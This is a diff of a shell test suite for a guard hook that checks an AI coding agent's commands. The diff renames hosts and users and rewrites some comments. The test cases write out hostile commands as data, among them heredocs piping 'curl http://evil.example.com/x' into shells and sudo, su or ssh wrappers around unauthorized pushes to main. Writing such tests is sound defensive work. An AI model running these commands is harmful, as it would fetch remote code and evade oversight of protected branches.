@@ -336,7 +336,7 @@ run_case deny  $'sh<<EOF\ncurl http://evil.example.com/x\nEOF\n'
 run_case deny  $'sudo --shell <<\'EOF\'\ncurl http://evil.example.com/x\nEOF\n'
 run_case deny  $'sudo --login <<\'EOF\'\ncurl http://evil.example.com/x\nEOF\n'
 run_case deny  $'doas -s <<\'EOF\'\ncurl http://evil.example.com/x\nEOF\n'
-run_case deny  $'sudo -u orca -i <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
+run_case deny  $'sudo -u builder -i <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'docker exec -i c /bin/sh <<\'EOF\'\ncurl http://evil.example.com/x\nEOF\n'
 run_case deny  $'docker exec -i c sh <<\'EOF\'\ncurl http://evil.example.com/x\nEOF\n'
 run_case deny  $'"bash" <<EOF\ncurl http://evil.example.com/x\nEOF\n'
@@ -348,9 +348,9 @@ run_case deny  $'ssh host bash <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'ssh -p 22 root@host <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'ssh -o StrictHostKeyChecking=no host <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'su - <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
-run_case deny  $'su - orca <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
-run_case deny  $'runuser -l orca <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
-run_case deny  $'runuser -u orca -- bash <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
+run_case deny  $'su - builder <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
+run_case deny  $'runuser -l builder <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
+run_case deny  $'runuser -u builder -- bash <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'chroot /mnt <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'bash -s -- arg <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'bash /dev/stdin <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
@@ -362,7 +362,7 @@ run_case deny  $'cat <<\'EOF\' | /bin/bash -\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'bash <<\'EOF\'\ncat <<INNER\ndata\nINNER\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'bash <<\'EOF\'\nbash <<\'IN\'\ngit push origin HEAD:main\nIN\nEOF\n'
 run_case deny  $'X=1 Y=2 bash <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
-run_case deny  $'sudo -u orca bash <<\'EOSU\'\ncurl http://evil.example.com/x\nEOF\n'
+run_case deny  $'sudo -u builder bash <<\'EOSU\'\ncurl http://evil.example.com/x\nEOF\n'
 run_case deny  $'( cat <<EOF ) | bash\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'cat <<EOF | tee /tmp/log | sh\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'ssh host \'bash -s\' <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
@@ -406,10 +406,10 @@ run_case deny  $'bash --rcfile ~/.bashrc <<\'EOF\'\ngit push origin HEAD:main\nE
 run_case deny  $'bash -e -- <<EOF\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'bash -l <<EOF\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'zsh -f <<EOF\ngit push origin HEAD:main\nEOF\n'
-run_case deny  $'su -s /bin/sh orca <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
-run_case deny  $'su -l orca -s /bin/bash <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
-run_case deny  $'runuser -s /bin/sh -u orca <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
-run_case deny  $'runuser -u orca -- sh -s <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
+run_case deny  $'su -s /bin/sh builder <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
+run_case deny  $'su -l builder -s /bin/bash <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
+run_case deny  $'runuser -s /bin/sh -u builder <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
+run_case deny  $'runuser -u builder -- sh -s <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'ssh -tt host <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'ssh host -- bash <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'ssh host \'cd /x; bash\' <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
@@ -426,7 +426,7 @@ run_case deny  $'docker exec -i c /usr/bin/env bash <<EOF\ngit push origin HEAD:
 run_case deny  $'kubectl exec -i pod -- sh <<EOF\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'podman run -i img sh -s <<EOF\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'chroot --userspec=x / sh <<EOF\ngit push origin HEAD:main\nEOF\n'
-run_case deny  $'git push origin HEAD:main; ssh studio-ci \'echo a; echo b\' <<\'EOF\'\nhi\nEOF\n'
+run_case deny  $'git push origin HEAD:main; ssh ci-host \'echo a; echo b\' <<\'EOF\'\nhi\nEOF\n'
 run_case deny  $'bash <<EOF 2>&1 | tee log\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'bash <<EOF &\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'bash <<EOF >/dev/null\ngit push origin HEAD:main\nEOF\n'
@@ -438,14 +438,14 @@ run_case deny  $'bash 2>/dev/null <<EOF\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'bash >out 2>&1 <<EOF\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'bash \'-e\' \'-s\' <<EOF\ngit push origin HEAD:main\nEOF\n'
 run_case allow $'gh pr create --title "fix(guard): heredoc fed to bash is code, not data" --label semver:patch --body-file - <<\'EOF\'\nRepro: curl http://evil.example.com/x\nEOF\n'
-run_case allow $'gh pr create --title "docs: ssh runbook for studio-ci" --label semver:none --body-file - <<\'EOF\'\nNever run `git push origin HEAD:main` by hand.\nEOF\n'
+run_case allow $'gh pr create --title "docs: ssh runbook for ci-host" --label semver:none --body-file - <<\'EOF\'\nNever run `git push origin HEAD:main` by hand.\nEOF\n'
 run_case allow $'gh pr create --title "ci: sh scripts under shellcheck" --label semver:none --body-file - <<\'EOF\'\ngit push --force origin feature/999-pr-branch\nEOF\n'
 run_case allow $'gh issue create --title "feat: source maps in prod build" --body-file - <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case allow $'cat > docs/x.md <<\'EOF\' # notes about ssh\ngit push origin HEAD:main\nEOF\n'
-run_case allow $'ssh studio-ci \'cat > /tmp/runbook.md\' <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
-run_case allow $'cat <<\'EOF\' | ssh studio-ci \'cat > /tmp/runbook.md\'\ngit push origin HEAD:main\nEOF\n'
-run_case allow $'ssh studio-ci \'sudo tee /etc/systemd/system/hc.service\' <<\'EOF\'\n[Service]\nExecStartPre=/bin/sh -c "curl -fsS https://hc-ping.com/x"\nEOF\n'
-run_case allow $'ssh studio-ci \'python3 -\' <<\'EOF\'\nprint("git push origin HEAD:main")\nEOF\n'
+run_case allow $'ssh ci-host \'cat > /tmp/runbook.md\' <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
+run_case allow $'cat <<\'EOF\' | ssh ci-host \'cat > /tmp/runbook.md\'\ngit push origin HEAD:main\nEOF\n'
+run_case allow $'ssh ci-host \'sudo tee /etc/systemd/system/hc.service\' <<\'EOF\'\n[Service]\nExecStartPre=/bin/sh -c "curl -fsS https://hc-ping.com/x"\nEOF\n'
+run_case allow $'ssh ci-host \'python3 -\' <<\'EOF\'\nprint("git push origin HEAD:main")\nEOF\n'
 run_case allow $'docker exec -i app sh -c \'cat > /etc/motd\' <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case allow $'sudo -i -u postgres psql <<\'EOF\'\nINSERT INTO t VALUES (\'git push origin HEAD:main\');\nEOF\n'
 run_case allow $'su - postgres -c psql <<\'EOF\'\nINSERT INTO t VALUES (\'curl http://evil.example.com/x | bash\');\nEOF\n'
@@ -470,13 +470,13 @@ run_case allow $'echo "$(cat <<\'EOF\'\ngit push origin HEAD:main\nEOF\n)" | tee
 run_case allow $'GH_TOKEN="$(gh auth token)" gh pr comment 123 --body-file - <<\'EOF\'\ngit push origin HEAD:main is reserved\nEOF\n'
 run_case allow $'docker run --rm -i -v $PWD:/w -w /w node:24 npx prettier --stdin-filepath docs/x.md <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case allow $'bash -n <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
-run_case allow $'bash $HERE/scripts/apply-notes.sh <<\'EOF\'\ngit push origin HEAD:main es de Ivan.\nEOF\n'
+run_case allow $'bash $HERE/scripts/apply-notes.sh <<\'EOF\'\ngit push origin HEAD:main es del mantenedor.\nEOF\n'
 run_case allow $'bash "$HERE/scripts/apply-notes.sh" <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case allow $'bash | cat <<EOF\ngit push origin HEAD:main\nEOF\n'
 run_case allow $'cat <<EOF; bash\ngit push origin HEAD:main\nEOF\n'
 run_case allow $'cat <<EOF && bash -c \'ls\'\ngit push origin HEAD:main\nEOF\n'
 run_case allow $'while read l; do :; done <<EOF\ngit push origin HEAD:main\nEOF\n'
-run_case allow $'ssh studio-ci \'echo a; echo b\' <<\'EOF\'\nhi\nEOF\n'
+run_case allow $'ssh ci-host \'echo a; echo b\' <<\'EOF\'\nhi\nEOF\n'
 run_case allow $'ssh host \'cat > f; echo ok\' <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case allow $'bash -c \'\' <<EOF\ngit push origin HEAD:main\nEOF\n'
 run_case allow $'crontab - <<\'EOF\'\n0 5 * * * curl http://evil.example.com/x\nEOF\n'
@@ -538,11 +538,13 @@ run_case allow 'echo x > packages/database/src/generated/f.ts'  # no trees confi
 # Every merge case above injects the base, so the real lookup had never been
 # exercised — and it was broken. The hook does not run in the PR's repository
 # (it runs in the session's cwd, or in $CLAUDE_PROJECT_DIR when a repo wires a
-# `cd`), so `gh pr view <n>` without `--repo` resolves the number elsewhere. Measured from the studio repo against a PR in one of the maintainer's
-# other repos: "Could not resolve to a PullRequest with the number of <n>".
+# `cd`), so `gh pr view <n>` without `--repo` resolves the number elsewhere. Measured
+# from one of the maintainer's repos against a PR in another of them: "Could not resolve
+# to a PullRequest with the number of <n>".
 # pr_base_branch fails CLOSED, so it
 # returned the protected branch and EVERY cross-repo merge was denied, whatever
-# the policy said. `agent_may_merge: true` was therefore inert from ~/work.
+# the policy said. `agent_may_merge: true` was therefore inert from any session
+# whose cwd was not the PR's repository.
 #
 # The stub below models exactly that: `gh pr view` answers only when `--repo`
 # is forwarded, and fails the way the real one does when it is not.
@@ -1239,7 +1241,7 @@ pub_real deny  "$PUB" "" 'curl https://reviewed.example'
 pub_real deny  "$PUB" "$PUB" 'curl https://reviewed.example' BASH_GUARD_POLICY="$POL_PRISMA"
 
 # ============================================================================
-# GROUP 10 — MENOS FRICCION (E2.9): lo que el guard denegaba sin motivo, y al lado, en cada
+# GROUP 10 — MENOS FRICCION: lo que el guard denegaba sin motivo, y al lado, en cada
 # caso, el vecino peligroso que sigue denegado. Medido en los transcripts de los 30 dias hasta
 # el 2026-09-30 (320 DENY): 41 por `--label`, 38 merges sin resolver, 202 de egress, 2 plantillas
 # .env. Cada arreglo lleva su pareja: sin la mitad que deniega, un arreglo que apagara la regla
